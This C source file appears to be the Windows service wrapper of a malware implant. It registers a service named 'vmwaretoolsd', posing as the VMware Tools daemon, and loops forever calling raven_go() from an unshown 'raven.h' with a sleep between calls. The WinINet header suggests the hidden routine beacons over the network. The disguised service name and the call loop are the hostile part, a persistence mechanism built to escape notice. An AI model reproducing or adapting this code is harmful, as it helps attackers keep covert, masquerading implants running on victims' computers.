#include <wininet.h>
#include <windows.h>
#include "raven.h"

#define SERVICE_NAME "vmwaretoolsd"

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
 
void  ServiceMain(int argc, char* argv[]); 
void  ControlHandler(DWORD request); 
int InitService();

DWORD ThreadProc(LPVOID whatever) {
	while (TRUE) {
		raven_go();
		Sleep(SLEEP_TIME);
	}
}

int main(int argc, char * argv[]) { 
	SERVICE_TABLE_ENTRY ServiceTable[2];
	ServiceTable[0].lpServiceName = SERVICE_NAME;
	ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
	ServiceTable[1].lpServiceName = NULL;
	ServiceTable[1].lpServiceProc = NULL;
	StartServiceCtrlDispatcher(ServiceTable);  
}

void ServiceMain(int argc, char* argv[]) { 
	int error; 
 
	ServiceStatus.dwServiceType        = SERVICE_WIN32; 
	ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
	ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	ServiceStatus.dwWin32ExitCode      = 0; 
	ServiceStatus.dwServiceSpecificExitCode = 0; 
	ServiceStatus.dwCheckPoint         = 0; 
	ServiceStatus.dwWaitHint           = 0; 
 
	hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, (LPHANDLER_FUNCTION)ControlHandler); 

	if (hStatus == (SERVICE_STATUS_HANDLE)0) {
		return;
	}

	ThreadProc(NULL);
}
 
void ControlHandler(DWORD request) { 
	switch(request) {
		case SERVICE_CONTROL_STOP: 
			ServiceStatus.dwWin32ExitCode = 0; 
			ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
			SetServiceStatus (hStatus, &ServiceStatus);
			return; 
 
		case SERVICE_CONTROL_SHUTDOWN: 
			ServiceStatus.dwWin32ExitCode = 0; 
			ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
			SetServiceStatus (hStatus, &ServiceStatus);
			return; 
        
		default:
			break;
	}
 
	SetServiceStatus (hStatus,  &ServiceStatus);
	return; 
} 
